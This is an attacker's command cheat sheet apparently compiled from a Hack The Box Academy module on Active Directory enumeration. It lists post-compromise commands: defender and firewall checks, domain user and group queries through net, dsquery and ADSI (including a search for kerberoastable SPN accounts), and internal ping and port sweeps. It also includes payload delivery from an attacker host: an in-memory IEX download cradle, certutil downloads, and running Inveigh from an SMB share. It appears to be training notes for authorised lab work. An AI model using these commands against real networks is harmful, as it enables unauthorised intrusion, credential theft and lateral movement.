# Section 16: Living Off the Land

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1360
- Code/command blocks: 16

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-Module
Get-ExecutionPolicy -List
whoami
Get-ChildItem Env: | ft key,value
```

```powershell
Get-host
powershell.exe -version 2
Get-host
get-module
```

```powershell
netsh advfirewall show allprofiles
```

```cmd
sc query windefend
```

```powershell
Get-MpComputerStatus
```

```powershell
qwinsta
```

```powershell
arp -a
```

```powershell
route print
```

```powershell
wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

```powershell
net group /domain
```

```powershell
net user /domain {{USERNAME}}
```

> **Caveat:** `dsquery` needs **RSAT / AD DS tools** — present on DCs and admin boxes, **not** on a stock member/web server. On a typical foothold it errors out (and an `nc` shell often hides the stderr, so you just see blank output). Use the `net` commands above or the `[adsisearcher]` block below as the no-RSAT fallback. Also note `dsquery` needs an object type or `*` — `dsquery <name>` alone is invalid; use `dsquery user -name svc_sql`.

```powershell
dsquery user
```

```powershell
dsquery computer
```

```powershell
dsquery * "CN=Users,DC={{DOMAIN_NB}},DC=LOCAL"
```

```powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

```powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

## Pure PowerShell LDAP via ADSI (no RSAT)

> Built into PowerShell — works on any domain-joined box (or as SYSTEM = machine account) with **no tools to install**. The reliable stand-in for `dsquery` on a foothold.

```powershell
# all users
([adsisearcher]'(objectClass=user)').FindAll().Properties.samaccountname
```

```powershell
# a specific user's SPNs / attributes
([adsisearcher]'(samaccountname={{USERNAME}})').FindAll().Properties.serviceprincipalname
```

```powershell
# all computers
([adsisearcher]'(objectClass=computer)').FindAll().Properties.name
```

```powershell
# a specific computer by name
([adsisearcher]'(name={{COMPUTER_NAME}})').FindAll().Properties.dnshostname
```

```powershell
# arbitrary LDAP filter (e.g. accounts with an SPN — kerberoastable)
([adsisearcher]'(servicePrincipalName=*)').FindAll().Properties.samaccountname
```

## Getting tools onto a box (HTTP / SMB pull)

> `{{LHOST}}` = your attack box IP. Host the file once on Kali, then pull with a one-liner on each box instead of copying manually.

### Serve from your attack box (Kali)

```bash
# HTTP
python3 -m http.server 80
```

```bash
# SMB (Impacket) — share name "share", current dir
impacket-smbserver share . -smb2support
```

### Pull onto a Windows target

```powershell
# PowerShell download
iwr http://{{LHOST}}/Inveigh.exe -OutFile C:\Windows\Temp\Inveigh.exe
```

```cmd
:: certutil LOLBIN
certutil -urlcache -f http://{{LHOST}}/Inveigh.exe Inveigh.exe
```

```powershell
# Run straight from the SMB share (no local copy)
\\{{LHOST}}\share\Inveigh.exe
```

```powershell
# In-memory, never touches disk (download cradle)
IEX(New-Object Net.WebClient).DownloadString('http://{{LHOST}}/script.ps1')
```

### Pull onto a Linux target

```bash
wget http://{{LHOST}}/linpeas.sh -O /tmp/linpeas.sh
curl http://{{LHOST}}/linpeas.sh -o /tmp/linpeas.sh
```

## Internal host discovery from a foothold (pivot recon)

> Find hosts/subnets the compromised box can reach but Kali can't. Run these **on the foothold**. (Tunnelling to actually reach them is kept in a separate folder.)

### What networks / hosts can this box see?

```cmd
:: Windows — interfaces, routes, neighbours, active connections
ipconfig /all
route print
arp -a
netstat -ano
```

```powershell
# PowerShell equivalents
Get-NetIPConfiguration
Get-NetRoute
Get-NetNeighbor
Get-NetTCPConnection -State Established | ft -Auto
```

```bash
# Linux — interfaces, routes, ARP/neighbours, hosts file, connections
ip a
ip route
ip neigh          # or: arp -a
cat /etc/hosts
netstat -antup    # or: ss -antup
```

### Ping-sweep an internal /24 (from the foothold)

> `{{NETWORK}}` = the internal /24 **prefix** — first 3 octets only, no trailing dot or mask (e.g. `10.10.10`). The loop appends the last octet (`$_` / `%i` / `$i`).

```cmd
:: Windows cmd
for /L %i in (1,1,254) do @ping -n 1 -w 100 {{NETWORK}}.%i | find "Reply"
```

```powershell
# PowerShell
1..254 | % { $ip="{{NETWORK}}.$_"; if (Test-Connection -Count 1 -Quiet -ComputerName $ip) { "$ip up" } }
```

```bash
# Linux (parallel)
for i in $(seq 1 254); do (ping -c1 -W1 {{NETWORK}}.$i >/dev/null && echo "{{NETWORK}}.$i up") & done; wait
```

### Port-check sweep (when ICMP is blocked)

```powershell
# PowerShell — check a single port across the /24 (e.g. 445)
1..254 | % { $ip="{{NETWORK}}.$_"; if ((New-Object Net.Sockets.TcpClient).ConnectAsync($ip,445).Wait(200)) { "$ip:445 open" } }
```

```bash
# Linux — bash /dev/tcp, no nmap needed
for i in $(seq 1 254); do (echo > /dev/tcp/{{NETWORK}}.$i/445) 2>/dev/null && echo "{{NETWORK}}.$i:445 open"; done
```

